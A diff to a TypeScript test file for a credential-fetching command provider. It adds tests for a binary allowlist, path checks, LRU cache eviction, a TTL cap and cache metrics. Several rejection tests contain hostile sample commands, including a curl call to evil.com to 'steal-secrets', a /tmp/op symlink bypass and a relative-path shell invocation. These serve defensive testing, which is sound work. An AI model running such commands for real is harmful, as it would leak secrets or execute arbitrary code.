@@ -1,12 +1,14 @@
 /**
  * Tests for command-based credential provider.
- * Issue #1671.
+ * Issue #1671, #2189.
  */
 import { describe, it, expect, vi, afterEach } from 'vitest';
 import {
   executeCredentialCommand,
   resolveCommandCredential,
   clearCredentialCache,
+  getCredentialCacheMetrics,
+  ALLOWED_BINARIES,
 } from './command-provider.ts';
 
 // Mock child_process.execFile (safe: no shell injection, uses execFile not exec)
@@ -24,6 +26,15 @@ afterEach(() => {
 });
 
 describe('credentials/command-provider', () => {
+  describe('ALLOWED_BINARIES', () => {
+    it('includes expected credential tool binaries', () => {
+      expect(ALLOWED_BINARIES).toContain('op');
+      expect(ALLOWED_BINARIES).toContain('aws');
+      expect(ALLOWED_BINARIES).toContain('gcloud');
+      expect(ALLOWED_BINARIES).toContain('vault');
+    });
+  });
+
   describe('executeCredentialCommand', () => {
     it('returns trimmed stdout on success', async () => {
       mockedExecFile.mockImplementation(
@@ -46,7 +57,7 @@ describe('credentials/command-provider', () => {
       );
 
       await expect(
-        executeCredentialCommand('empty-cmd', 5000),
+        executeCredentialCommand('op read something', 5000),
       ).rejects.toThrow('empty output');
     });
 
@@ -61,7 +72,7 @@ describe('credentials/command-provider', () => {
       );
 
       await expect(
-        executeCredentialCommand('failing-cmd', 5000),
+        executeCredentialCommand('op read something', 5000),
       ).rejects.toThrow('failed with exit code');
     });
 
@@ -76,7 +87,7 @@ describe('credentials/command-provider', () => {
       );
 
       await expect(
-        executeCredentialCommand('slow-cmd', 1000),
+        executeCredentialCommand('op read something', 1000),
       ).rejects.toThrow('timed out after 1000ms');
     });
 
@@ -102,6 +113,53 @@ describe('credentials/command-provider', () => {
       await executeCredentialCommand('op read op://vault/key', 5000);
       expect(capturedCmd).toBe('op');
       expect(capturedArgs).toEqual(['read', 'op://vault/key']);
+    });
+
+    // Issue #2189: Command allowlisting
+    it('rejects disallowed binary', async () => {
+      await expect(
+        executeCredentialCommand('curl http://evil.com/steal-secrets', 5000),
+      ).rejects.toThrow('not in the allowlist');
+    });
+
+    it('rejects commands with absolute path even if basename is allowed', async () => {
+      // Prevents bypass via attacker-controlled /tmp/op symlink
+      await expect(
+        executeCredentialCommand('/tmp/op read op://vault/key', 5000),
+      ).rejects.toThrow('bare binary name');
+    });
+
+    it('rejects commands with path traversal in binary', async () => {
+      await expect(
+        executeCredentialCommand('/usr/bin/curl http://evil.com', 5000),
+      ).rejects.toThrow('bare binary name');
+    });
+
+    it('rejects commands with relative path', async () => {
+      await expect(
+        executeCredentialCommand('../../../bin/sh -c "id"', 5000),
+      ).rejects.toThrow('bare binary name');
+    });
+
+    it('rejects commands with shell metacharacters in arguments', async () => {
+      // Even though we use execFile (no shell), the binary must be allowlisted
+      await expect(
+        executeCredentialCommand('sh -c "op read op://vault/key"', 5000),
+      ).rejects.toThrow('not in the allowlist');
+    });
+
+    it('allows all allowlisted binaries', async () => {
+      mockedExecFile.mockImplementation(
+        (_cmd: unknown, _args: unknown, _opts: unknown, cb: unknown) => {
+          (cb as Function)(null, 'value', '');
+          return {} as ReturnType<typeof execFile>;
+        },
+      );
+
+      for (const binary of ALLOWED_BINARIES) {
+        const result = await executeCredentialCommand(`${binary} some-arg`, 5000);
+        expect(result).toBe('value');
+      }
     });
   });
 
@@ -135,7 +193,7 @@ describe('credentials/command-provider', () => {
 
       const result1 = await resolveCommandCredential(
         'cred-cached',
-        'cache-cmd',
+        'op read op://vault/key',
         5000,
         60, // 60s cache
       );
@@ -143,7 +201,7 @@ describe('credentials/command-provider', () => {
 
       const result2 = await resolveCommandCredential(
         'cred-cached',
-        'cache-cmd',
+        'op read op://vault/key',
         5000,
         60,
       );
@@ -162,8 +220,8 @@ describe('credentials/command-provider', () => {
         },
       );
 
-      await resolveCommandCredential('cred-no-cache', 'no-cache-cmd', 5000, 0);
-      await resolveCommandCredential('cred-no-cache', 'no-cache-cmd', 5000, 0);
+      await resolveCommandCredential('cred-no-cache', 'op get item', 5000, 0);
+      await resolveCommandCredential('cred-no-cache', 'op get item', 5000, 0);
 
       expect(callCount).toBe(2);
     });
@@ -178,14 +236,91 @@ describe('credentials/command-provider', () => {
         },
       );
 
-      await resolveCommandCredential('cred-clear', 'clear-cmd', 5000, 60);
+      await resolveCommandCredential('cred-clear', 'op get item', 5000, 60);
       expect(callCount).toBe(1);
 
       clearCredentialCache();
 
-      await resolveCommandCredential('cred-clear', 'clear-cmd', 5000, 60);
+      await resolveCommandCredential('cred-clear', 'op get item', 5000, 60);
       // Command should be called again after cache clear
       expect(callCount).toBe(2);
+    });
+
+    // Issue #2189: LRU cache with max size
+    it('evicts oldest entries when cache exceeds max size', async () => {
+      let callCount = 0;
+      mockedExecFile.mockImplementation(
+        (_cmd: unknown, _args: unknown, _opts: unknown, cb: unknown) => {
+          callCount++;
+          (cb as Function)(null, `secret-${callCount}`, '');
+          return {} as ReturnType<typeof execFile>;
+        },
+      );
+
+      // Fill cache beyond max (100 entries)
+      for (let i = 0; i < 101; i++) {
+        await resolveCommandCredential(`cred-${i}`, 'op get item', 5000, 600);
+      }
+
+      // The first entry should have been evicted (LRU)
+      const metrics = getCredentialCacheMetrics();
+      expect(metrics.size).toBeLessThanOrEqual(100);
+    });
+
+    // Issue #2189: Max TTL enforcement
+    it('enforces max TTL of 15 minutes even if higher TTL requested', async () => {
+      let callCount = 0;
+      mockedExecFile.mockImplementation(
+        (_cmd: unknown, _args: unknown, _opts: unknown, cb: unknown) => {
+          callCount++;
+          (cb as Function)(null, `secret-${callCount}`, '');
+          return {} as ReturnType<typeof execFile>;
+        },
+      );
+
+      // Request a 1-hour TTL — should be capped at 15 minutes
+      await resolveCommandCredential('cred-max-ttl', 'op get item', 5000, 3600);
+
+      const metrics = getCredentialCacheMetrics();
+      expect(metrics.maxTtlSeconds).toBe(900); // 15 minutes
+    });
+
+    // Issue #2189: Cache metrics exposure
+    it('exposes cache metrics', async () => {
+      mockedExecFile.mockImplementation(
+        (_cmd: unknown, _args: unknown, _opts: unknown, cb: unknown) => {
+          (cb as Function)(null, 'value', '');
+          return {} as ReturnType<typeof execFile>;
+        },
+      );
+
+      await resolveCommandCredential('metrics-test', 'op get item', 5000, 60);
+
+      const metrics = getCredentialCacheMetrics();
+      expect(metrics).toHaveProperty('size');
+      expect(metrics).toHaveProperty('hits');
+      expect(metrics).toHaveProperty('misses');
+      expect(metrics).toHaveProperty('maxSize');
+      expect(metrics).toHaveProperty('maxTtlSeconds');
+      expect(metrics.size).toBe(1);
+      expect(metrics.misses).toBeGreaterThanOrEqual(1);
+    });
+
+    it('increments hit counter on cache hit', async () => {
+      mockedExecFile.mockImplementation(
+        (_cmd: unknown, _args: unknown, _opts: unknown, cb: unknown) => {
+          (cb as Function)(null, 'value', '');
+          return {} as ReturnType<typeof execFile>;
+        },
+      );
+
+      await resolveCommandCredential('hit-test', 'op get item', 5000, 60);
+      const before = getCredentialCacheMetrics();
+
+      await resolveCommandCredential('hit-test', 'op get item', 5000, 60);
+      const after = getCredentialCacheMetrics();
+
+      expect(after.hits).toBe(before.hits + 1);
     });
   });
 });
